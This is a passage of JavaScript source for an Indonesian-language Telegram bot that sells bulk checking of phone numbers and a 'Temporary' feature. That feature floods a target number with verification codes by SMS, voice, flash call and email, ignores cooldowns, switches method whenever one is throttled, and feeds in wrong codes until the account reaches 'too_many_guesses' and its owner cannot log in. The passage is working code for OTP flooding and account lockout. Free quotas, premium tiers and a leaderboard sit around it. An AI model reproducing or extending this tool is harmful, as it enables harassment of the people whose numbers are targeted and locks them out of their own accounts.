  const raw = await redis.get(`detect:batch:${batchId}`);
  if (!raw) return safeAnswerCb(ctx, "ᴅᴀᴛᴀ ʙᴀᴛᴄʜ ꜱᴜᴅᴀʜ ᴋᴀᴅᴀʟᴜᴡᴀʀꜱᴀ", { show_alert: true });
  let data;
  try { data = typeof raw === "string" ? JSON.parse(raw) : raw; } catch (_) { data = null; }
  if (!data || !Array.isArray(data.numbers) || data.numbers.length === 0) {
    return safeAnswerCb(ctx, "ᴅᴀᴛᴀ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ", { show_alert: true });
  }
  if (Number(data.userId) !== userId) {
    return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ", { show_alert: true });
  }

  const numbers = data.numbers;
  const premium = await isPremiumUser(userId);
  if (!premium) {
    const used = await getUsed(userId);
    const remaining = FREE_DAILY_LIMIT - used;
    if (remaining < numbers.length) {
      return safeAnswerCb(ctx, `⚠ ꜱɪꜱᴀ ᴋᴜᴏᴛᴀ ʜᴀʀɪ ɪɴɪ (${Math.max(0, remaining)}) ᴛɪᴅᴀᴋ ᴄᴜᴋᴜᴘ`, { show_alert: true });
    }
  }

  await safeAnswerCb(ctx, "↻ ᴍᴇᴍᴘᴇʀʙᴀʀᴜɪ ᴅᴀᴛᴀ...");
  const startedAt = Date.now();
  const msgId = ctx.callbackQuery.message.message_id;
  const chatId = ctx.chat.id;

  try {
    await ctx.telegram.editMessageText(chatId, msgId, undefined, summarizeProgress([], numbers.length), {
      parse_mode: "HTML"
    });
  } catch (_) {}

  let lastEdit = 0;
  const minInterval = numbers.length <= 5 ? 280 : 600;
  const results = await checkAll(numbers, async (done, total, partialResults) => {
    const now = Date.now();
    if (now - lastEdit < minInterval && done < total) return;
    lastEdit = now;
    try {
      await ctx.telegram.editMessageText(chatId, msgId, undefined, summarizeProgress(partialResults, total), {
        parse_mode: "HTML"
      });
    } catch (_) {}
  }, { forceFresh: true });

  if (!premium) await addUsed(userId, numbers.length);

  const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
  const output = buildDetectionOutput(numbers, results, elapsedSec);

  await incrUserField(userId, "total_detections", numbers.length);
  if (output.readyCount > 0) {
    await incrUserField(userId, "ready_detections", output.readyCount);
    await redis.zincrby("leaderboard:ready", output.readyCount, String(userId));
  }

  await redis.set(`detect:batch:${batchId}`, JSON.stringify({
    userId,
    numbers,
    lastChunks: output.chunks
  }), { ex: 86400 });

  const resKb = buildResultKeyboard(batchId);
  const chunks = output.chunks;

  if (chunks.length === 1) {
    try {
      await ctx.telegram.editMessageText(chatId, msgId, undefined, chunks[0], {
        parse_mode: "HTML",
        ...resKb
      });
    } catch (_) {}
  } else {
    try {
      await ctx.telegram.editMessageText(chatId, msgId, undefined, chunks[0], {
        parse_mode: "HTML"
      });
    } catch (_) {}
    for (let i = 1; i < chunks.length; i++) {
      const isLast = i === chunks.length - 1;
      try {
        await ctx.reply(chunks[i], {
          parse_mode: "HTML",
          ...(isLast ? resKb : {})
        });
      } catch (_) {}
    }
  }
});

bot.action(/^eml_info_([a-f0-9]+)$/i, async (ctx) => {
  const batchId = ctx.match[1];
  await safeAnswerCb(ctx);
  try {
    await ctx.editMessageText(buildEmailGuidePage(), {
      parse_mode: "HTML",
      ...inlineKb([
        [
          btn("⟢ ᴋᴇᴍʙᴀʟɪ ᴋᴇ ʜᴀꜱɪʟ", `eml_back_${batchId}`, "primary"),
          btn("↻ ᴄᴇᴋ ᴜʟᴀɴɢ", `eml_upd_${batchId}`, "success")
        ]
      ])
    });
  } catch (_) {}
});

bot.action(/^eml_back_([a-f0-9]+)$/i, async (ctx) => {
  const batchId = ctx.match[1];
  const raw = await redis.get(`email:batch:${batchId}`);
  if (!raw) return safeAnswerCb(ctx, "ᴅᴀᴛᴀ ʜᴀꜱɪʟ ꜱᴜᴅᴀʜ ᴋᴀᴅᴀʟᴜᴡᴀʀꜱᴀ", { show_alert: true });
  let data;
  try { data = typeof raw === "string" ? JSON.parse(raw) : raw; } catch (_) { data = null; }
  if (!data || !Array.isArray(data.lastChunks) || data.lastChunks.length === 0) {
    return safeAnswerCb(ctx, "ᴅᴀᴛᴀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", { show_alert: true });
  }
  await safeAnswerCb(ctx);
  const lastChunk = data.lastChunks[data.lastChunks.length - 1];
  try {
    await ctx.editMessageText(lastChunk, {
      parse_mode: "HTML",
      ...buildEmailResultKeyboard(batchId)
    });
  } catch (_) {}
});

bot.action(/^eml_upd_([a-f0-9]+)$/i, async (ctx) => {
  const batchId = ctx.match[1];
  const userId = ctx.from.id;
  const raw = await redis.get(`email:batch:${batchId}`);
  if (!raw) return safeAnswerCb(ctx, "ᴅᴀᴛᴀ ʙᴀᴛᴄʜ ꜱᴜᴅᴀʜ ᴋᴀᴅᴀʟᴜᴡᴀʀꜱᴀ", { show_alert: true });
  let data;
  try { data = typeof raw === "string" ? JSON.parse(raw) : raw; } catch (_) { data = null; }
  if (!data || !Array.isArray(data.numbers) || data.numbers.length === 0) {
    return safeAnswerCb(ctx, "ᴅᴀᴛᴀ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ", { show_alert: true });
  }
  if (Number(data.userId) !== userId) {
    return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ", { show_alert: true });
  }

  const numbers = data.numbers;
  const access = await assertFeatureAccess(userId, "email");
  if (!access.ok) {
    return safeAnswerCb(ctx, `⚠ ᴋᴜᴏᴛᴀ ᴇᴍᴀɪʟ ɢʀᴀᴛɪꜱ ʜᴀʀɪ ɪɴɪ ʜᴀʙɪꜱ (${FREE_FEATURE_LIMIT}x)`, { show_alert: true });
  }
  if (!access.premium && numbers.length > access.remaining) {
    return safeAnswerCb(ctx, `⚠ ꜱɪꜱᴀ ᴋᴜᴏᴛᴀ ᴇᴍᴀɪʟ (${access.remaining}) ᴛɪᴅᴀᴋ ᴄᴜᴋᴜᴘ`, { show_alert: true });
  }

  await safeAnswerCb(ctx, "↻ ᴍᴇᴍᴇʀɪᴋꜱᴀ ᴜʟᴀɴɢ ᴏᴘꜱɪ ᴇᴍᴀɪʟ...");
  const startedAt = Date.now();
  const msgId = ctx.callbackQuery.message.message_id;
  const chatId = ctx.chat.id;

  try {
    await ctx.telegram.editMessageText(chatId, msgId, undefined, summarizeEmailProgress([], numbers.length), {
      parse_mode: "HTML"
    });
  } catch (_) {}

  let lastEdit = 0;
  const minInterval = numbers.length <= 5 ? 280 : 600;
  const results = await triggerEmailAll(numbers, async (done, total, partialResults) => {
    const now = Date.now();
    if (now - lastEdit < minInterval && done < total) return;
    lastEdit = now;
    try {
      await ctx.telegram.editMessageText(chatId, msgId, undefined, summarizeEmailProgress(partialResults, total), {
        parse_mode: "HTML"
      });
    } catch (_) {}
  });

  if (!access.premium) await addFeatureUsed(userId, "email", numbers.length);

  const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
  const output = buildEmailOutput(numbers, results, elapsedSec);

  await incrUserField(userId, "email_triggers", numbers.length);

  await redis.set(`email:batch:${batchId}`, JSON.stringify({
    userId,
    numbers,
    lastChunks: output.chunks
  }), { ex: 86400 });

  const resKb = buildEmailResultKeyboard(batchId);
  const chunks = output.chunks;

  if (chunks.length === 1) {
    try {
      await ctx.telegram.editMessageText(chatId, msgId, undefined, chunks[0], {
        parse_mode: "HTML",
        ...resKb
      });
    } catch (_) {}
  } else {
    try {
      await ctx.telegram.editMessageText(chatId, msgId, undefined, chunks[0], {
        parse_mode: "HTML"
      });
    } catch (_) {}
    for (let i = 1; i < chunks.length; i++) {
      const isLast = i === chunks.length - 1;
      try {
        await ctx.reply(chunks[i], {
          parse_mode: "HTML",
          ...(isLast ? resKb : {})
        });
      } catch (_) {}
    }
  }
});

bot.action("cancel_detect", async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  await safeAnswerCb(ctx, "ᴅɪʙᴀᴛᴀʟᴋᴀɴ");
  await showPlainPanel(ctx, await buildDashboard(userId, ctx.from), false);
});

bot.action("cancel_email", async (ctx) => {
  const userId = ctx.from.id;
  awaitingEmailInput.delete(userId);
  await safeAnswerCb(ctx, "ᴅɪʙᴀᴛᴀʟᴋᴀɴ");
  await showPlainPanel(ctx, await buildDashboard(userId, ctx.from), false);
});

function methodLabel(m) {
  const map = { sms: "ꜱᴍꜱ", voice: "ᴠᴏɪᴄᴇ", flash: "ꜰʟᴀꜱʜ", email: "ᴇᴍᴀɪʟ", wa_old: "ᴡᴀ_ᴏʟᴅ" };
  return map[m] || m;
}

function methodWaitLabel(sec) {
  const n = Number(sec) || 0;
  if (n <= 0) return "● ᴛᴇʀꜱᴇᴅɪᴀ";
  if (n >= 600) return `◐ ᴄᴅ ${formatCooldown(n)}`;
  return `◌ ᴊᴇᴅᴀ ${formatCooldown(n)}`;
}

function formatMethodsBlock(methods, isDeviceOn) {
  const m = methods || {};
  const lines = [];
  lines.push(`▸ ꜱᴍꜱ ⦂ ${methodWaitLabel(m.sms)}`);
  lines.push(`▸ ᴠᴏɪᴄᴇ ⦂ ${methodWaitLabel(m.voice)}`);
  lines.push(`▸ ꜰʟᴀꜱʜ ⦂ ${methodWaitLabel(m.flash)}`);
  if (!isDeviceOn && !(Number(m.wa_old) > 0)) {
    lines.push("▸ ᴡᴀ_ᴏʟᴅ ⦂ ᴏꜰꜰ · ʙɪꜱᴀ ᴅɪᴄᴏʙᴀ");
  } else {
    lines.push(`▸ ᴡᴀ_ᴏʟᴅ ⦂ ${methodWaitLabel(m.wa_old)}`);
  }
  lines.push(`▸ ᴇᴍᴀɪʟ ⦂ ${methodWaitLabel(m.email)}`);
  return lines.join("\n");
}

function tempProbeStatusLine(probe) {
  if (!probe) return "ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ";
  if (probe.isBanned) return "ʙᴀɴɴᴇᴅ";
  if (probe.isCloneBlocked) return "ᴛɪᴅᴀᴋ ꜱᴜᴘᴘᴏʀᴛ ᴄʟᴏɴᴇ";
  const cd = Number(probe.cooldownSeconds || 0);
  const methods = probe.methods || {};
  const waits = ["sms", "voice", "flash", "email", "wa_old"].map(k => Number(methods[k] || 0));
  const maxWait = Math.max(cd, ...waits);
  const minPositive = waits.filter(w => w > 0).sort((a, b) => a - b)[0] || 0;
  if (maxWait >= 600) return `ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴇʀᴀꜱ ${formatCooldown(maxWait)}`;
  if (minPositive > 0) return `ᴊᴇᴅᴀ ꜱᴇᴍᴇɴᴛᴀʀᴀ ${formatCooldown(minPositive)}`;
  if (probe.isReady) return "ꜱɪᴀᴘ ᴋɪʀɪᴍ";
  return String(probe.state || "ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ");
}

function buildSendMethodKeyboard(phone, probe) {
  const m = (probe && probe.methods) || {};
  const dev = Boolean(probe && probe.isDeviceOn);
  const rows = [];
  const row1 = [];
  const row2 = [];
  // Tampilkan semua metode; yang sedang jeda tetap bisa dipilih (loop akan menunggu)
  row1.push(btn("ꜱᴍꜱ", "send_sms", "primary"));
  row1.push(btn("ᴠᴏɪᴄᴇ", "send_voice", "primary"));
  row1.push(btn("ꜰʟᴀꜱʜ", "send_flash", "primary"));
  row2.push(btn("ᴡᴀ ᴏʟᴅ", "send_wa_old", "success"));
  row2.push(btn("ᴇᴍᴀɪʟ", "send_email", "success"));
  rows.push(row1);
  if (row2.length) rows.push(row2);
  rows.push([btn("◂ ᴋᴇᴍʙᴀʟɪ", "nav_home", "primary"), btn("✕ ʙᴀᴛᴀʟ", "cancel_send", "danger")]);
  return inlineKb(rows);
}

function buildTempStartKeyboard(method) {
  return inlineKb([
    [btn("▶ ᴍᴜʟᴀɪ", `temp_start_${method}`, "success")],
    [btn("◂ ᴋᴇᴍʙᴀʟɪ", "temp_back_methods", "primary"), btn("✕ ʙᴀᴛᴀʟ", "cancel_send", "danger")]
  ]);
}

function buildTempStopKeyboard() {
  return inlineKb([[btn("⏹ ꜱᴛᴏᴘ", "cancel_send", "danger")]]);
}

async function sendTempStatus(ctx, text, kb, { forceNew = false } = {}) {
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  if (!forceNew) {
    const prev = activeInlineMsg.get(userId);
    if (prev && prev.chatId === chatId) {
      const edited = await safeEditMessage(ctx.telegram, chatId, prev.messageId, text, kb);
      if (edited.ok) return prev;
    }
  }
  try {
    const sent = await ctx.reply(text, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      ...(kb || {})
    });
    activeInlineMsg.set(userId, { chatId, messageId: sent.message_id });
    return sent;
  } catch (_) {
    return null;
  }
}

function buildTempStatusText(opts) {
  const {
    title = "✧ Temporary",
    phone,
    method,
    lastStatus,
    jeda,
    sisa,
    attempt,
    successCount,
    guessCount,
    methods,
    devOn,
    footer
  } = opts;
  const lines = [title, ""];
  const block = [];
  if (phone) block.push(`Nomor      : <code>${esc(phone)}</code>`);
  if (method) block.push(`Metode     : ${methodLabel(method)}`);
  if (lastStatus) block.push(`Status     : ${lastStatus}`);
  if (jeda != null && jeda !== "") block.push(`Jeda       : ${jeda}`);
  if (sisa != null && sisa !== "") block.push(`Sisa       : ${sisa}`);
  if (attempt != null) block.push(`Percobaan  : #${attempt}`);
  if (successCount != null) block.push(`Terkirim   : ${successCount}×`);
  if (guessCount != null) block.push(`Isi kode   : ${guessCount}× salah`);
  if (block.length) {
    lines.push(`<blockquote>${block.join("\n")}</blockquote>`);
  }
  if (methods) {
    lines.push("");
    lines.push("◈ Metode");
    lines.push(`<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`);
  }
  if (footer) {
    lines.push("");
    if (Array.isArray(footer)) lines.push(...footer);
    else lines.push(footer);
  }
  return lines.join("\n");
}

async function sleepCancellable(job, totalMs, stepMs = 250) {
  const end = Date.now() + totalMs;
  while (!job.cancelled && Date.now() < end) {
    if (job.abort && job.abort.signal.aborted) {
      job.cancelled = true;
      break;
    }
    const left = end - Date.now();
    if (left <= 0) break;
    await new Promise(r => setTimeout(r, Math.min(stepMs, left)));
  }
}

async function runAutoSendLoop(ctx, phone, method) {
  const userId = ctx.from.id;
  const preferredMethod = String(method || "sms").toLowerCase();
  const access = await assertFeatureAccess(userId, "temporary");
  if (!access.ok) {
    return sendTempStatus(ctx, [
      "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ",
      "",
      `<blockquote>▸ ᴋᴜᴏᴛᴀ ɢʀᴀᴛɪꜱ ʜᴀʀɪ ɪɴɪ ʜᴀʙɪꜱ (${FREE_FEATURE_LIMIT}×).</blockquote>`
    ].join("\n"), inlineKb([[btn("♛ ᴘʀᴇᴍɪᴜᴍ", "premium_back", "success")]]), { forceNew: true });
  }
  if (!access.premium) {
    await addFeatureUsed(userId, "temporary", 1);
  }
  if (activeSendJobs.has(userId)) {
    const prev = activeSendJobs.get(userId);
    prev.cancelled = true;
    if (prev.abort) {
      try { prev.abort.abort(); } catch (_) {}
    }
  }
  const abort = new AbortController();
  const job = { cancelled: false, abort };
  activeSendJobs.set(userId, job);
  pendingSendPhone.set(userId, phone);
  pendingSendMethod.set(userId, preferredMethod);

  const stopKb = buildTempStopKeyboard();
  let attempt = 0;
  let lastRes = null;
  let stoppedReason = null;
  let successCount = 0;
  let activeMethod = preferredMethod;
  let consecutiveTimeouts = 0;
  let lastSpamAt = 0;
  const maxAttempts = TEMP_MAX_ATTEMPTS;
  const budgetDeadline = Date.now() + TEMP_BUDGET_MS;
  const remainingBudget = () => Math.max(0, budgetDeadline - Date.now());
  const budgetExhausted = () => remainingBudget() < 2500;

  const methodOrder = () => {
    if (preferredMethod === "wa_old") return ["wa_old", "sms", "voice", "flash", "email"];
    if (preferredMethod === "email") return ["email", "sms", "voice", "flash", "wa_old"];
    return [preferredMethod, "sms", "voice", "flash", "email", "wa_old"];
  };

  const pickMethod = (methods, devOn) => {
    const m = methods || {};
    const order = methodOrder();
    for (const k of order) {
      if (k === "wa_old" && !devOn && preferredMethod !== "wa_old") continue;
      if (Number(m[k] || 0) <= 0) return { method: k, wait: 0 };
    }
    let best = preferredMethod;
    let bestW = Infinity;
    for (const k of order) {
      if (k === "wa_old" && !devOn && preferredMethod !== "wa_old") continue;
      const w = Number(m[k] || 0);
      if (w < bestW) {
        bestW = w;
        best = k;
      }
    }
    return { method: best, wait: Number.isFinite(bestW) ? bestW : 0 };
  };

  const allHardLocked = (methods, devOn) => {
    const m = methods || {};
    const keys = ["sms", "voice", "flash", "email"];
    if (devOn || preferredMethod === "wa_old") keys.push("wa_old");
    if (!keys.length) return false;
    return keys.every((k) => Number(m[k] || 0) >= 600);
  };

  while (!job.cancelled && attempt < maxAttempts && !budgetExhausted()) {
    attempt += 1;

    const prevMethods = (lastRes && lastRes.methods) || {};
    const prevDev = Boolean(lastRes && lastRes.isDeviceOn);
    if (lastRes) {
      const picked = pickMethod(prevMethods, prevDev);
      activeMethod = picked.method;
      if (picked.wait > 0 && picked.wait < 600) {
        const waitMs = Math.min(picked.wait * 1000, remainingBudget() - 2000);
        if (waitMs < 500) {
          stoppedReason = "budget";
          break;
        }
        await sendTempStatus(ctx, buildTempStatusText({
          phone,
          method: activeMethod,
          lastStatus: "ɢᴀɴᴛɪ ᴍᴇᴛᴏᴅᴇ / ᴍᴇɴᴜɴɢɢᴜ",
          jeda: formatCooldown(picked.wait),
          attempt,
          successCount,
          methods: prevMethods,
          devOn: prevDev,
          footer: [
            "ⓘ ᴍᴇᴛᴏᴅᴇ ʟᴀɪɴ ᴍᴀꜱɪʜ ᴛᴇʀꜱᴇᴅɪᴀ — ʙᴇʟᴜᴍ ᴛᴇᴍᴘᴏʀᴀʀʏ.",
            "ⓘ ᴛᴇᴋᴀɴ <b>⏹ ꜱᴛᴏᴘ</b> ᴜɴᴛᴜᴋ ʙᴇʀʜᴇɴᴛɪ."
          ]
        }), stopKb, { forceNew: false });
        await sleepCancellable(job, Math.min(waitMs, 120000), 200);
        if (job.cancelled) break;
        if (budgetExhausted()) {
          stoppedReason = "budget";
          break;
        }
      }
    }
    method = activeMethod;

    let res;
    try {
      res = await sendVerificationCode(phone, method, {
        signal: abort.signal,
        skipProbe: true,
        forceSend: true,
        ignoreCooldown: true
      });
    } catch (e) {
      res = {
        success: false,
        phone,
        method,
        error: String(e && e.message ? e.message : e)
      };
    }
    lastRes = res;
    if (job.cancelled || abort.signal.aborted) {
      job.cancelled = true;
      stoppedReason = "cancelled";
      break;
    }

    const methods = (res && res.methods) || (res && res.probe && res.probe.methods) || {};
    const devOn = Boolean(res.isDeviceOn || (res.probe && res.probe.isDeviceOn));
    const methodWait = numWaitSafe(methods[method]);
    const cd = Number(res.cooldownSeconds || 0);
    const effectiveCd = methodWait > 0 ? methodWait : cd;
    const reason = String(res.rawReason || res.error || res.reason || "").toLowerCase();
    const errLow = String(res.error || "").toLowerCase();
    const isMethodBlocked = res.state === "METHOD_BLOCKED" || errLow === "bad_param" || errLow === "method_not_allowed";
    const isBanned = res.state === "BANNED" || errLow === "banned" || reason === "blocked" || reason === "banned";
    const isHardFail = ["INVALID_NUMBER"].includes(String(res.state || "")) ||
      ["invalid_phone", "no_code_endpoint"].includes(errLow);
    const isTimeout = /REQUEST_TIMEOUT|NETWORK_ERROR|HTTP_5|EMPTY_UPSTREAM|HTTP_429/i.test(errLow);

    if (res.success) {
      successCount += 1;
      consecutiveTimeouts = 0;
    } else if (isTimeout) {
      consecutiveTimeouts += 1;
    } else {
      consecutiveTimeouts = 0;
    }

    const isTempDone =
      res.state === "TEMPORARY_DONE" ||
      reason === "too_many_guesses";

    if (isTempDone) {
      stoppedReason = "locked";
      await sendTempStatus(ctx, buildTempStatusText({
        title: "✧ Temporary selesai",
        phone: res.phone || phone,
        method,
        lastStatus: "tidak bisa login",
        jeda: formatCooldown(Math.max(effectiveCd, 600)),
        attempt,
        successCount,
        guessCount: res.guessCount || 0,
        methods,
        devOn,
        footer: [
          "ⓘ Kolom kode 6 digit sudah limit (too_many_guesses).",
          "ⓘ Semua jalur verifikasi terkunci sementara."
        ]
      }), buildSendMethodKeyboard(phone, { methods, isDeviceOn: devOn }), { forceNew: false });
      break;
    }

    if (isBanned) {
      stoppedReason = "locked";
      await sendTempStatus(ctx, buildTempStatusText({
        title: "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ꜱᴇʟᴇꜱᴀɪ",
        phone: res.phone || phone,
        method,
        lastStatus: "ʙᴀɴɴᴇᴅ / ʙʟᴏᴄᴋᴇᴅ",
        attempt,
        successCount,
        methods,
        devOn,
        footer: "ⓘ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ʟᴏɢɪɴ (banned/blocked)."
      }), buildSendMethodKeyboard(phone, { methods, isDeviceOn: devOn }), { forceNew: false });
      break;
    }

    if (allHardLocked(methods, devOn)) {
      stoppedReason = "locked";
      await sendTempStatus(ctx, buildTempStatusText({
        title: "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ꜱᴇʟᴇꜱᴀɪ",
        phone: res.phone || phone,
        method,
        lastStatus: "ꜱᴇᴍᴜᴀ ᴍᴇᴛᴏᴅᴇ ᴋᴇʀᴀꜱ",
        jeda: formatCooldown(Math.max(effectiveCd, ...Object.values(methods || {}).map(Number).filter(Number.isFinite))),
        attempt,
        successCount,
        methods,
        devOn,
        footer: [
          "ⓘ ꜱᴇᴍᴜᴀ ᴍᴇᴛᴏᴅᴇ ᴄᴏᴏʟᴅᴏᴡɴ ≥10 ᴍᴇɴɪᴛ.",
          "ⓘ ʟᴏɢɪɴ ꜱᴀᴀᴛ ɪɴɪ ꜱᴀɴɢᴀᴛ ꜱᴜʟɪᴛ / ᴛᴇʀᴋᴜɴᴄɪ."
        ]
      }), buildSendMethodKeyboard(phone, { methods, isDeviceOn: devOn }), { forceNew: false });
      break;
    }

    if (isHardFail) {
      stoppedReason = "failed";
      await sendTempStatus(ctx, buildTempStatusText({
        title: "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ɢᴀɢᴀʟ",
        phone: res.phone || phone,
        method,
        lastStatus: "ᴅɪᴛᴏʟᴀᴋ",
        attempt,
        successCount,
        methods,
        devOn,
        footer: `ⓘ ᴀʟᴀꜱᴀɴ ⦂ ${esc(res.error || res.state || "gagal")}`
      }), buildSendMethodKeyboard(phone, { methods, isDeviceOn: devOn }), { forceNew: false });
      break;
    }

    if (isMethodBlocked) {
      await sendTempStatus(ctx, buildTempStatusText({
        phone: res.phone || phone,
        method,
        lastStatus: "ᴍᴇᴛᴏᴅᴇ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ",
        attempt,
        successCount,
        methods,
        devOn,
        footer: "ⓘ ᴏᴛᴏᴍᴀᴛɪꜱ ɢᴀɴᴛɪ ᴍᴇᴛᴏᴅᴇ ʟᴀɪɴ..."
      }), stopKb, { forceNew: false });
      await sleepCancellable(job, 500);
      continue;
    }

    if (consecutiveTimeouts >= 8) {
      stoppedReason = "failed";
      await sendTempStatus(ctx, buildTempStatusText({
        title: "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ɢᴀɢᴀʟ",
        phone: res.phone || phone,
        method,
        lastStatus: "ᴛɪᴍᴇᴏᴜᴛ ʙᴇʀᴜʟᴀɴɢ",
        attempt,
        successCount,
        methods,
        devOn,
        footer: [
          "ⓘ ᴋᴏɴᴇᴋꜱɪ ᴋᴇ ꜱᴇʀᴠᴇʀ ᴡᴀ ɢᴀɢᴀʟ ʙᴇʀᴜʟᴀɴɢ.",
          "ⓘ ᴄᴇᴋ ᴘʀᴏxʏ / ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ."
        ]
      }), buildSendMethodKeyboard(phone, { methods, isDeviceOn: devOn }), { forceNew: false });
      break;
    }

    if (res.success || (effectiveCd > 0 && effectiveCd < 600)) {
      const picked = pickMethod(methods, devOn);
      if (picked.wait === 0 && picked.method !== method) {
        activeMethod = picked.method;
        await sendTempStatus(ctx, buildTempStatusText({
          phone: res.phone || phone,
          method: activeMethod,
          lastStatus: "ɢᴀɴᴛɪ ᴍᴇᴛᴏᴅᴇ",
          attempt,
          successCount,
          methods,
          devOn,
          footer: [
            `ⓘ ${methodLabel(method)} ᴊᴇᴅᴀ — ʟᴀɴᴊᴜᴛ ${methodLabel(activeMethod)}.`,
            "ⓘ ᴛᴇᴋᴀɴ <b>⏹ ꜱᴛᴏᴘ</b> ᴜɴᴛᴜᴋ ʙᴇʀʜᴇɴᴛɪ."
          ]
        }), stopKb, { forceNew: false });
        await sleepCancellable(job, 400);
        continue;
      }

      const waitSec = Math.min(Math.max(effectiveCd > 0 ? effectiveCd : 2, 2), 180);
      const waitMs = Math.min(waitSec * 1000, Math.max(0, remainingBudget() - 2000));
      if (waitMs < 500) {
        stoppedReason = "budget";
        break;
      }
      await sendTempStatus(ctx, buildTempStatusText({
        phone: res.phone || phone,
        method,
        lastStatus: res.success ? "terkirim + isi kode" : "jeda",
        jeda: formatCooldown(effectiveCd || waitSec),
        attempt,
        successCount,
        guessCount: res.guessCount || 0,
        methods,
        devOn,
        footer: [
          "ⓘ Belum temporary — masih ada jalur login.",
          "ⓘ Tekan <b>⏹ Stop</b> untuk berhenti."
        ]
      }), stopKb, { forceNew: false });
      await sleepCancellable(job, waitMs, 200);
      if (job.cancelled) {
        stoppedReason = "cancelled";
        break;
      }
      if (budgetExhausted()) {
        stoppedReason = "budget";
        break;
      }
      continue;
    }

    const errMsg = String(res.error || res.state || "gagal");
    const now = Date.now();
    if (now - lastSpamAt >= 4000 || attempt === 1) {
      lastSpamAt = now;
      await sendTempStatus(ctx, buildTempStatusText({
        phone,
        method,
        lastStatus: isTimeout ? "ᴍᴇɴᴄᴏʙᴀ ᴜʟᴀɴɢ" : "ᴍᴇɴɢᴜʟᴀɴɢɪ",
        attempt,
        successCount,
        methods,
        devOn,
        footer: `ⓘ ${esc(errMsg)}`
      }), stopKb, { forceNew: false });
    }
    const backoff = Math.min(
      isTimeout ? Math.min(8000, 1200 + consecutiveTimeouts * 900) : 1200,
      Math.max(0, remainingBudget() - 1500)
    );
    if (backoff < 200) {
      stoppedReason = "budget";
      break;
    }
    await sleepCancellable(job, backoff, 200);
  }

  if (!job.cancelled && stoppedReason !== "locked" && stoppedReason !== "failed") {
    const methods = (lastRes && lastRes.methods) || {};
    const devOn = Boolean(lastRes && lastRes.isDeviceOn);
    const isBudget = stoppedReason === "budget";
    const isMax = attempt >= maxAttempts;
    if (isBudget || isMax) {
      await sendTempStatus(ctx, buildTempStatusText({
        title: "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ᴊᴇᴅᴀ",
        phone,
        method: activeMethod,
        lastStatus: isBudget ? "ʙᴀᴛᴀꜱ ᴡᴀᴋᴛᴜ ꜱᴇꜱɪ" : "ʙᴀᴛᴀꜱ ᴘᴇʀᴄᴏʙᴀᴀɴ",
        attempt,
        successCount,
        methods,
        devOn,
        footer: isBudget
          ? "ⓘ ꜱᴇꜱɪ ꜱᴇʀᴠᴇʀ ʜᴀᴍᴘɪʀ ʜᴀʙɪꜱ — ᴛᴇᴋᴀɴ ▶ ᴍᴜʟᴀɪ ʟᴀɢɪ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ."
          : "ⓘ ʙᴀᴛᴀꜱ ᴘᴇʀᴄᴏʙᴀᴀɴ ᴛᴇʀᴄᴀᴘᴀɪ — ᴄᴇᴋ ᴍᴀɴᴜᴀʟ ᴀᴘᴀᴋᴀʜ ꜱᴜᴅᴀʜ ᴛᴇʀᴋᴜɴᴄɪ."
      }), buildTempStartKeyboard(activeMethod), { forceNew: false });
    }
  }

  if (activeSendJobs.get(userId) === job) {
    activeSendJobs.delete(userId);
  }
}

function numWaitSafe(v) {
  const n = Number(v);
  return Number.isFinite(n) && n > 0 ? Math.floor(n) : 0;
}

bot.action(/^send_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
  const userId = ctx.from.id;
  const method = String(ctx.match[1] || "sms").toLowerCase();
  const phone = pendingSendPhone.get(userId);
  await safeAnswerCb(ctx);
  if (!phone) {
    return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ ᴛᴇᴍᴘᴏʀᴀʀʏ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
  }
  pendingSendMethod.set(userId, method);
  return editInline(ctx, [
    "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ",
    "",
    "<blockquote>" +
    `▸ ɴᴏᴍᴏʀ   ⦂ <code>${esc(phone)}</code>\n` +
    `▸ ᴍᴇᴛᴏᴅᴇ  ⦂ <b>${methodLabel(method)}</b>\n` +
    "▸ ᴍᴏᴅᴇ    ⦂ ᴀᴜᴛᴏ ꜱᴀᴍᴘᴀɪ ʟɪᴍɪᴛ" +
    "</blockquote>",
    "",
    "◈ ᴀᴋꜱɪ",
    "<blockquote>" +
    "▶ ᴍᴜʟᴀɪ — ᴋɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ ʙᴇʀᴜʟᴀɴɢ\n" +
    "◂ ᴋᴇᴍʙᴀʟɪ — ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ ʟᴀɪɴ\n" +
    "⏹ ꜱᴛᴏᴘ — ʜᴇɴᴛɪᴋᴀɴ ꜱᴀᴀᴛ ʙᴇʀᴊᴀʟᴀɴ" +
